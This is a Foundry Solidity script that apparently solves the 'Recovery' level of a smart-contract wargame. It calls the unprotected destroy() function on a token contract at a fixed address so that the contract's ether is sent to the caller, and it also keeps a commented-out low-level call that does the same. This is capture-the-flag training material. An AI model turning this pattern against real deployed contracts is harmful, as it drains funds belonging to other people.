// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/17-Recovery/Recovery.sol";

contract ExploitScript is Script {
 
    SimpleToken level17 = SimpleToken(payable(0x23aA8044aA509c133bfBcf2B9e28001257b896b2));

    function run() public {
        vm.startBroadcast();
        level17.destroy(payable(msg.sender));
       // address(0x23aA8044aA509c133bfBcf2B9e28001257b896b2).call(abi.encodeWithSignature("destroy(address)", msg.sender));
        vm.stopBroadcast();
    }
}

 